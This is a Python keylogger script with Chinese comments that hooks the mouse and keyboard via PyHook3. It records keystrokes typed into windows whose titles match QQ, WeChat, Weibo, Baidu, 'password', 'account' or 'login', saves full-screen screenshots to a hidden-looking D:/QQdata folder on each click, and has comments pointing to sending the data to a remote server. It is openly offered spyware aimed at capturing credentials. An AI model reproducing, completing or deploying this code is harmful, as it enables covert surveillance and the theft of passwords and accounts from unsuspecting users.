#coding: utf-8
#author：握着玫瑰的屠夫
#date：2020.11.16
#describe：KeyBoard Monitor

import PyHook3
import pythoncom
import socket
import time
import os
from PIL import ImageGrab
#from ctypes import *

start=time.time()

#将获取的数据保存于本地文件下
def write_msg_to_txt(msg):
    if os.path.exists('D:\\QQdata\\data')==False:
        os.system('mkdir d:\\QQdata\\data')
    f=open('D:/QQdata/data/Monitor.txt', 'a')
    f.write(msg+'\r\n')
    f.close()

def onMouseEvent(event):
    #监听鼠标事件
    global MSG #全局变量
    if len(MSG) !=0:
        #send_msg_to_server(MSG)
        write_msg_to_txt(MSG)
        MSG=''
        pic_date = time.strftime('%Y%m%d%H%M%S', time.localtime(time.time()))
        #将用户屏幕截图，保存到本地某个目录下（也可发远程发送到自己服务器）
        pic = ImageGrab.grab()
        pic.save('D:/QQdata/data/mouse_%s.jpg' %pic_date)        
    return True

def onKeyboardEvent(event):
    #监听键盘
    keyid=event.Ascii
    keywords=chr(event.Ascii)
    keychar=event.Key
    title=event.WindowName
    
    #--------------判断用户目前在操作的界面开头是否包含关键词算法---------------
    lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login']
    words=''
    outword=''

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        break    
                    elif len(words) >len(lists[n]):
                        words=''
                        break
                if len(words) >0:
                    print(title) #需要替换 
                    if 127 > keyid >32:
                        print(keywords) #需要替换
                    else:    
                        print(keychar) #需要替换
    #-----------------------------------------------------------------------
    return True

def main():
    #创建hook句柄
    hookm = PyHook3.HookManager()
    #监控鼠标
    hookm.SubscribeMouseLeftDown(onMouseEvent)
    hookm.HookMouse()
    #监控键盘
    hookm.KeyDown =onKeyboardEvent
    hookm.HookKeyboard()
    #循环获取消息
    pythoncom.PumpMessages()
    
if __name__ == "__main__":
    main()

